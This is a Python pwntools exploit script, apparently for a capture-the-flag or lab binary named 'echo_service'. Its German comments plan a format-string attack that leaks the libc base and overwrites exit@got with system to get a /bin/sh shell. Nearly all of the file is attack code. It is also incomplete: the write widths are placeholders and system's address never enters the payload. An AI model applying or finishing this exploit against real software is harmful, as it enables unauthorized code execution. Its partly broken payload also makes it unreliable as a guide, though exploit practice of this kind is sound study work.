#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./echo_service", checksec=False)
libc = exe.libc
context.log_level = "error"

# Format String Vuln. 
# Idee:
# - got Override von puts (oder exit)
# ==> brauche file offset ==> brauche Leak von einer Adresse in dem selben Segment (z.B. main/start)
# damit weiß ich wo ich was schreiben muss (Adresse von puts@got)
# Was schreiben?
# - system mit bin/sh
# ==> brauche auch libc base (krieg ich durch io geschenkt!)

# Angriffs Plan:
# Leak exe base mit %p
# Finde selbst Referenz im Stack für Write where what (19 via gdb)
# ==> im Format string muss die Adresse von puts@got stehen und hinten die Adresse von system
# Außerdem muss auf dem Stack die Adresse von /bin/sh stehen (32 Bit ==> direkt beim Format String)

def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    b *0x0804933e
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def leakLibCBaes(io):
    io.recvuntil(b">>")
    io.sendline(b"1")
    io.recvuntil(b">")

    payload = b"%83$p"
    
    io.sendline(payload)
    addr = io.recvuntil(b">>")[0:11]

    libc.address = int(addr, 16) - libc.sym["__libc_start_call_main"] - 121


def main():
    io = start()

    # add your exploit code here

    leakLibCBaes(io)

    payload = b""

    payload += p32(exe.got.exit)
    payload += (p32(exe.got.exit + 2))
    system = libc.sym.system


    io.sendline(b"1")
    io.recvuntil(b">")

    payload += b"%1$" +  b"x"
    payload += b"%19$hn"

    payload += b"%1$" + b"x"
    payload += b"%20$hn"


    io.sendline(payload)
    #print(payload)
    io.recvuntil(b">>")
    io.interactive()
    #io.sendline(b"2")

    print(hex(system))
    



if __name__ == "__main__":
    main()
